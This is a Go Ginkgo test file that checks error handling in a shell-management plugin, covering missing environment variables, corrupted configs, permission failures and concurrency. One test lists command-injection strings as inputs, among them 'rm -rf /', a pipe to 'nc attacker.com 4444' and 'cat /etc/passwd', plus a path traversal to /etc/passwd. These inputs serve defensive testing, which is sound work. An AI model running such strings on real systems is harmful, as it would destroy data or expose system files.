package main_test

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	sdk "github.com/jameswlane/devex/packages/plugin-sdk"
	main "github.com/jameswlane/devex/packages/tool-shell"
)

// Mock logger for Shell error handling tests
type MockShellLogger struct {
	messages []string
	errors   []string
	warnings []string
	silent   bool
}

func (m *MockShellLogger) Printf(format string, args ...any) {
	if !m.silent {
		m.messages = append(m.messages, fmt.Sprintf(format, args...))
	}
}

func (m *MockShellLogger) Println(msg string, args ...any) {
	if !m.silent {
		if len(args) > 0 {
			m.messages = append(m.messages, fmt.Sprintf(msg, args...))
		} else {
			m.messages = append(m.messages, msg)
		}
	}
}

func (m *MockShellLogger) Success(msg string, args ...any) {
	if !m.silent {
		m.messages = append(m.messages, fmt.Sprintf("SUCCESS: "+msg, args...))
	}
}

func (m *MockShellLogger) Warning(msg string, args ...any) {
	if !m.silent {
		m.warnings = append(m.warnings, fmt.Sprintf(msg, args...))
	}
}

func (m *MockShellLogger) ErrorMsg(msg string, args ...any) {
	if !m.silent {
		m.errors = append(m.errors, fmt.Sprintf(msg, args...))
	}
}

func (m *MockShellLogger) Info(msg string, keyvals ...any) {
	if !m.silent {
		m.messages = append(m.messages, "INFO: "+msg)
	}
}

func (m *MockShellLogger) Warn(msg string, keyvals ...any) {
	if !m.silent {
		m.warnings = append(m.warnings, "WARN: "+msg)
	}
}

func (m *MockShellLogger) Error(msg string, err error, keyvals ...any) {
	if !m.silent {
		if err != nil {
			m.errors = append(m.errors, fmt.Sprintf("ERROR: %s - %v", msg, err))
		} else {
			m.errors = append(m.errors, "ERROR: "+msg)
		}
	}
}

func (m *MockShellLogger) Debug(msg string, keyvals ...any) {
	if !m.silent {
		m.messages = append(m.messages, "DEBUG: "+msg)
	}
}

func (m *MockShellLogger) HasError(substring string) bool {
	for _, err := range m.errors {
		if strings.Contains(err, substring) {
			return true
		}
	}
	return false
}

func (m *MockShellLogger) HasWarning(substring string) bool {
	for _, warning := range m.warnings {
		if strings.Contains(warning, substring) {
			return true
		}
	}
	return false
}

func (m *MockShellLogger) Clear() {
	m.messages = nil
	m.errors = nil
	m.warnings = nil
}

var _ = Describe("Shell Plugin Error Handling", func() {
	var (
		plugin        *main.ShellPlugin
		mockLogger    *MockShellLogger
		originalShell string
		originalPath  string
		originalHome  string
		tempDir       string
	)

	BeforeEach(func() {
		// Save original environment
		originalShell = os.Getenv("SHELL")
		originalPath = os.Getenv("PATH")
		originalHome = os.Getenv("HOME")

		// Create temporary directory for test files
		var err error
		tempDir, err = os.MkdirTemp("", "shell-test-")
		Expect(err).ToNot(HaveOccurred())

		// Create plugin with mock logger
		info := sdk.PluginInfo{
			Name:        "tool-shell",
			Version:     "test",
			Description: "Test Shell plugin for error handling",
		}

		plugin = &main.ShellPlugin{
			BasePlugin: sdk.NewBasePlugin(info),
		}

		mockLogger = &MockShellLogger{}
		plugin.SetLogger(mockLogger)
	})

	AfterEach(func() {
		// Restore original environment
		if originalShell != "" {
			_ = os.Setenv("SHELL", originalShell)
		} else {
			_ = os.Unsetenv("SHELL")
		}
		_ = os.Setenv("PATH", originalPath)
		_ = os.Setenv("HOME", originalHome)

		// Clean up temp directory
		_ = os.RemoveAll(tempDir)

		mockLogger.Clear()
	})

	Describe("Shell Detection Failures", func() {
		Context("when SHELL environment variable is not set", func() {
			It("should handle missing SHELL variable gracefully", func() {
				_ = os.Unsetenv("SHELL")

				shell := plugin.DetectCurrentShell()
				Expect(shell).To(Equal("unknown"))

				// Should not panic when detecting unknown shell
				Expect(shell).To(Not(BeEmpty()))
			})
		})

		Context("when SHELL points to non-existent shell", func() {
			It("should handle invalid shell paths", func() {
				_ = os.Setenv("SHELL", "/nonexistent/shell")

				shell := plugin.DetectCurrentShell()
				Expect(shell).To(Equal("shell")) // Should extract name from path

				// Operations should handle gracefully
				err := plugin.Execute("setup", []string{})
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when shell binary is corrupted or missing", func() {
			It("should detect shell unavailability", func() {
				// Test with shell that doesn't exist in PATH
				_ = os.Setenv("SHELL", "/usr/bin/nonexistent-shell")

				err := plugin.Execute("setup", []string{"bash"})
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Configuration File Errors", func() {
		Context("when shell config files are corrupted", func() {
			It("should handle corrupted shell configuration files", func() {
				// Create corrupted config file in temp directory
				configFile := filepath.Join(tempDir, ".bashrc")
				corruptedContent := "\x00\x01\x02invalid_binary_data\xff\xfe"
				err := os.WriteFile(configFile, []byte(corruptedContent), 0644)
				Expect(err).ToNot(HaveOccurred())

				_ = os.Setenv("HOME", tempDir)

				err = plugin.Execute("config", []string{"--list"})
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})

			It("should handle permission denied on config files", func() {
				// Create config file with restricted permissions
				configFile := filepath.Join(tempDir, ".zshrc")
				err := os.WriteFile(configFile, []byte("# test config"), 0000) // No permissions
				Expect(err).ToNot(HaveOccurred())

				_ = os.Setenv("HOME", tempDir)

				err = plugin.Execute("config", []string{"--backup"})
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when config directory doesn't exist", func() {
			It("should handle missing home directory", func() {
				_ = os.Setenv("HOME", "/nonexistent/directory")

				err := plugin.Execute("config", []string{})
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Shell Switching Failures", func() {
		Context("when target shell is not available", func() {
			It("should handle unavailable shells gracefully", func() {
				err := plugin.Execute("switch", []string{"nonexistent-shell"})

				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("shell"),
						ContainSubstring("not available"),
						ContainSubstring("not found"),
					))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})

			It("should handle shells not in PATH", func() {
				err := plugin.Execute("switch", []string{"/usr/bin/nonexistent-shell"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when chsh command fails", func() {
			It("should handle chsh permission failures", func() {
				// Skip if running as root
				if os.Getuid() == 0 {
					Skip("Running as root - cannot test chsh permission errors")
				}

				// Skip this test as it can hang waiting for sudo password
				// This is a known limitation of testing interactive commands
				Skip("Skipping interactive chsh test - hangs waiting for sudo password")
			})

			It("should handle missing chsh command", func() {
				// Temporarily modify PATH to simulate missing chsh
				_ = os.Setenv("PATH", "/tmp")

				err := plugin.Execute("switch", []string{"bash"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Backup and Restore Failures", func() {
		Context("when backup directory is inaccessible", func() {
			It("should handle backup creation failures", func() {
				// Set home to read-only directory
				readOnlyDir := filepath.Join(tempDir, "readonly")
				err := os.Mkdir(readOnlyDir, 0555) // Read-only
				Expect(err).ToNot(HaveOccurred())

				_ = os.Setenv("HOME", readOnlyDir)

				err = plugin.Execute("backup", []string{})
				if err != nil {
					Expect(err.Error()).To(SatisfyAny(
						ContainSubstring("permission"),
						ContainSubstring("backup"),
						ContainSubstring("failed"),
					))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when backup files are corrupted", func() {
			It("should handle corrupted backup files", func() {
				// Create corrupted backup file
				backupDir := filepath.Join(tempDir, ".devex", "backups")
				err := os.MkdirAll(backupDir, 0755)
				Expect(err).ToNot(HaveOccurred())

				corruptedBackup := filepath.Join(backupDir, "shell-backup.tar.gz")
				err = os.WriteFile(corruptedBackup, []byte("corrupted data"), 0644)
				Expect(err).ToNot(HaveOccurred())

				_ = os.Setenv("HOME", tempDir)

				err = plugin.Execute("backup", []string{"--restore"})
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when disk space is insufficient", func() {
			It("should handle disk space issues during backup", func() {
				// This would require specific disk space testing in real environments
				err := plugin.Execute("backup", []string{})

				if err != nil && strings.Contains(strings.ToLower(err.Error()), "space") {
					Expect(err.Error()).To(ContainSubstring("space"))
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Shell Setup Failures", func() {
		Context("when shell setup encounters errors", func() {
			It("should handle setup failures gracefully", func() {
				err := plugin.Execute("setup", []string{"invalid-shell-name"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
					Expect(err.Error()).To(Not(BeEmpty()))
				}
			})

			It("should handle setup with no shell specified", func() {
				err := plugin.Execute("setup", []string{})

				// Should either use default shell or require specification
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when shell profile setup fails", func() {
			It("should handle profile creation failures", func() {
				// Set HOME to non-writable directory
				_ = os.Setenv("HOME", "/")

				err := plugin.Execute("setup", []string{"bash"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Invalid Input Handling", func() {
		Context("when provided with dangerous shell names", func() {
			It("should reject dangerous shell command injections", func() {
				dangerousShells := []string{
					"bash; rm -rf /",
					"zsh && malicious-command",
					"fish | nc attacker.com 4444",
					"sh$(rm -rf /)",
					"bash`malicious-command`",
					"/bin/bash; cat /etc/passwd",
				}

				for _, shellName := range dangerousShells {
					err := plugin.Execute("switch", []string{shellName})
					if err != nil {
						// Should fail safely without executing dangerous commands
						Expect(err.Error()).To(Not(ContainSubstring("command not found")))
					}
				}
			})

			It("should handle invalid shell paths", func() {
				invalidPaths := []string{
					"../../../etc/passwd",
					"/dev/null",
					"",
					" ",
					"\t",
					"\n",
				}

				for _, path := range invalidPaths {
					err := plugin.Execute("switch", []string{path})
					if err != nil {
						Expect(err.Error()).To(Not(ContainSubstring("panic")))
					}
				}
			})
		})

		Context("when arguments contain special characters", func() {
			It("should handle shell names with special characters safely", func() {
				specialShells := []string{
					"bash'",
					"zsh\"",
					"fish\\",
					"sh&",
					"bash|",
					"zsh>",
					"fish<",
				}

				for _, shell := range specialShells {
					err := plugin.Execute("setup", []string{shell})
					if err != nil {
						Expect(err.Error()).To(Not(ContainSubstring("panic")))
					}
				}
			})
		})
	})

	Describe("Environment Variable Issues", func() {
		Context("when PATH is corrupted or missing", func() {
			It("should handle missing PATH variable", func() {
				_ = os.Unsetenv("PATH")

				err := plugin.Execute("switch", []string{"bash"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})

			It("should handle corrupted PATH", func() {
				_ = os.Setenv("PATH", "::::::::nonexistent::::")

				err := plugin.Execute("setup", []string{"zsh"})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when HOME is not set or invalid", func() {
			It("should handle missing HOME variable", func() {
				_ = os.Unsetenv("HOME")

				err := plugin.Execute("config", []string{})

				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Concurrent Operation Handling", func() {
		Context("when multiple shell operations run simultaneously", func() {
			It("should handle concurrent backup operations", func() {
				done := make(chan bool, 3)

				// Launch concurrent operations
				for i := 0; i < 3; i++ {
					go func() {
						defer GinkgoRecover()
						err := plugin.Execute("backup", []string{})
						// Errors are acceptable for concurrent operations
						_ = err
						done <- true
					}()
				}

				// Wait for all operations
				for i := 0; i < 3; i++ {
					Eventually(done).Should(Receive())
				}
			})
		})
	})

	Describe("File System Errors", func() {
		Context("when file operations fail", func() {
			It("should handle read-only file system", func() {
				// Create read-only directory structure
				readOnlyHome := filepath.Join(tempDir, "readonly-home")
				err := os.Mkdir(readOnlyHome, 0755)
				Expect(err).ToNot(HaveOccurred())

				// Create some config files
				configFile := filepath.Join(readOnlyHome, ".bashrc")
				err = os.WriteFile(configFile, []byte("# test"), 0644)
				Expect(err).ToNot(HaveOccurred())

				// Make directory read-only
				err = os.Chmod(readOnlyHome, 0555)
				Expect(err).ToNot(HaveOccurred())

				_ = os.Setenv("HOME", readOnlyHome)

				err = plugin.Execute("config", []string{"--backup"})
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})

		Context("when symlinks are broken", func() {
			It("should handle broken symbolic links in config", func() {
				// Create broken symlink
				brokenLink := filepath.Join(tempDir, ".broken-bashrc")
				err := os.Symlink("/nonexistent/file", brokenLink)
				Expect(err).ToNot(HaveOccurred())

				_ = os.Setenv("HOME", tempDir)

				err = plugin.Execute("config", []string{})
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})

	Describe("Error Message Quality", func() {
		Context("error messages should be actionable", func() {
			It("should provide specific guidance for common shell errors", func() {
				err := plugin.Execute("switch", []string{"nonexistent-shell"})

				if err != nil {
					errorMsg := err.Error()

					// Should not contain technical internals
					Expect(errorMsg).To(Not(ContainSubstring("goroutine")))
					Expect(errorMsg).To(Not(ContainSubstring("runtime error")))
					Expect(errorMsg).To(Not(ContainSubstring("nil pointer")))

					// Should be informative
					Expect(len(errorMsg)).To(BeNumerically(">", 10))
					Expect(errorMsg).To(Not(Equal("error")))
				}
			})

			It("should include shell context in error messages", func() {
				shellName := "invalid-test-shell"
				err := plugin.Execute("setup", []string{shellName})

				if err != nil {
					errorMsg := err.Error()
					Expect(errorMsg).To(Not(BeEmpty()))
					Expect(errorMsg).To(Not(Equal("failed")))
				}
			})
		})

		Context("when providing suggestions", func() {
			It("should suggest alternatives for failed operations", func() {
				err := plugin.Execute("switch", []string{"nonexistent"})

				if err != nil {
					// Should suggest available shells or installation
					foundSuggestion := mockLogger.HasWarning("available") ||
						mockLogger.HasWarning("install") ||
						len(mockLogger.warnings) > 0

					// If no automatic suggestions, at least provide clear error
					if !foundSuggestion {
						Expect(err.Error()).To(Not(ContainSubstring("unknown error")))
					}
				}
			})
		})
	})

	Describe("Unknown Command Handling", func() {
		Context("when executing unknown commands", func() {
			It("should return helpful error for unknown commands", func() {
				err := plugin.Execute("invalid-shell-command", []string{})
				Expect(err).To(HaveOccurred())
				Expect(err.Error()).To(ContainSubstring("unknown command"))
				Expect(err.Error()).To(ContainSubstring("invalid-shell-command"))
			})

			It("should list available commands in error", func() {
				err := plugin.Execute("nonexistent", []string{})
				Expect(err).To(HaveOccurred())

				errorMsg := err.Error()
				Expect(errorMsg).To(ContainSubstring("unknown command"))

				// Should mention available commands if helpful
				availableCommands := []string{"setup", "switch", "config", "backup"}
				foundCommand := false
				for _, cmd := range availableCommands {
					if strings.Contains(strings.ToLower(errorMsg), cmd) {
						foundCommand = true
						break
					}
				}
				// Not strictly required, but helpful if implemented
				_ = foundCommand
			})
		})
	})

	Describe("Shell Detection Edge Cases", func() {
		Context("when dealing with unusual shell configurations", func() {
			It("should handle shells with version suffixes", func() {
				_ = os.Setenv("SHELL", "/usr/bin/bash-5.1")

				shell := plugin.DetectCurrentShell()
				Expect(shell).To(Equal("bash-5.1"))
			})

			It("should handle shells in unusual locations", func() {
				_ = os.Setenv("SHELL", "/opt/homebrew/bin/fish")

				shell := plugin.DetectCurrentShell()
				Expect(shell).To(Equal("fish"))

				// Operations should still work
				err := plugin.Execute("setup", []string{})
				if err != nil {
					Expect(err.Error()).To(Not(ContainSubstring("panic")))
				}
			})
		})
	})
})

// Performance and stress testing for Shell error conditions
var _ = Describe("Shell Plugin Stress Testing", func() {
	var plugin *main.ShellPlugin

	BeforeEach(func() {
		info := sdk.PluginInfo{
			Name:        "tool-shell",
			Version:     "test",
			Description: "Stress test Shell plugin",
		}

		plugin = &main.ShellPlugin{
			BasePlugin: sdk.NewBasePlugin(info),
		}

		mockLogger := &MockShellLogger{silent: true} // Silent for performance tests
		plugin.SetLogger(mockLogger)
	})

	Context("handling rapid shell detection calls", func() {
		It("should handle many shell detection calls efficiently", func() {
			for i := 0; i < 100; i++ {
				shell := plugin.DetectCurrentShell()
				Expect(shell).To(Not(BeEmpty()))
			}
		})
	})

	Context("handling concurrent shell operations", func() {
		It("should not deadlock with concurrent operations", func() {
			done := make(chan bool, 10)

			// Launch many concurrent shell detections
			for i := 0; i < 10; i++ {
				go func() {
					defer GinkgoRecover()
					shell := plugin.DetectCurrentShell()
					Expect(shell).To(Not(BeEmpty()))
					done <- true
				}()
			}

			// Wait for all operations
			for i := 0; i < 10; i++ {
				Eventually(done).Should(Receive())
			}
		})
	})

	Context("handling operations with many arguments", func() {
		It("should handle setup with long argument lists", func() {
			// Test with many configuration options
			var args []string
			for i := 0; i < 50; i++ {
				args = append(args, fmt.Sprintf("--option-%d", i))
			}

			err := plugin.Execute("setup", args)
			if err != nil {
				Expect(err.Error()).To(Not(ContainSubstring("panic")))
			}
		})
	})
})
